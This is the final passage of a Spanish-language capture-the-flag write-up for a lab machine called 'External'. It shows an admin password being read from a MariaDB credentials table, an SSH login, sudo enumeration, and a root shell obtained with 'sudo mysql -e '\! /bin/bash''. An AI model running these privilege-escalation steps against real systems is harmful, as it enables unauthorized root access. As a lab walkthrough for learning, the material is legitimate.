+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Reading</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">information</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">completion</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">column</span><span class="w"> </span><span class="n">names</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">You</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">turn</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">feature</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">quicker</span><span class="w"> </span><span class="n">startup</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="o">-</span><span class="n">A</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Database</span><span class="w"> </span><span class="n">changed</span><span class="w">
+</span></span></span></code></pre></div><p>Dentro de <strong>admindb</strong> hay la tabla <strong>credentials</strong> y dentro de credentials hay las credenciales del usuario admin.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">MariaDB</span><span class="w"> </span><span class="p">[</span><span class="n">admindb</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="kp">tables</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+-------------------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">Tables_in_admindb</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+-------------------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">credentials</span><span class="w">       </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+-------------------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1</span><span class="w"> </span><span class="n">row</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">001</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">MariaDB</span><span class="w"> </span><span class="p">[</span><span class="n">admindb</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">credentials</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------+-------+--------------------------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="k">user</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">password</span><span class="w">                 </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------+-------+--------------------------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">    </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">4</span><span class="o">********************</span><span class="mi">123</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------+-------+--------------------------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1</span><span class="w"> </span><span class="n">row</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">008</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></div><p>Me conecto al sistema con las credenciales obtenidas.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ ssh admin@192.168.1.112
+</span></span><span class="line"><span class="cl">admin@192.168.1.112&#39;s password: 
+</span></span><span class="line"><span class="cl">Linux external 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64
+</span></span><span class="line"><span class="cl">admin@external:~$
+</span></span></code></pre></div><p>Enumero permisos de sudo</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">admin@external:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries for admin on external:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User admin may run the following commands on external:
+</span></span><span class="line"><span class="cl">    (root) NOPASSWD: /usr/bin/mysql
+</span></span></code></pre></div><p>Obtengo el root usando este recurso de <a href="https://gtfobins.github.io/gtfobins/mysql/#sudo">gtfobins</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">admin@external:~$ sudo mysql -e &#39;\! /bin/bash&#39;
+</span></span><span class="line"><span class="cl">ERROR 1045 (28000): Access denied for user &#39;root&#39;@&#39;localhost&#39; (using password: NO)
+</span></span></code></pre></div><p>Añado la flag <strong>-p</strong> e introduzco la contraseña del usuario root de la base de datos.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">admin@external:~$ sudo mysql -e &#39;\! /bin/bash&#39; -p
+</span></span><span class="line"><span class="cl">Enter password: 
+</span></span><span class="line"><span class="cl">root@external:/home/admin# id
+</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) grupos=0(root)
+</span></span></code></pre></div><p>Y con esto ya tenemos resuelta la máquina External.</p>
+<p>Saludos!</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 .
+        
+    </small>
+</footer><a href="#" title="" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script src="https://0x-noname.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
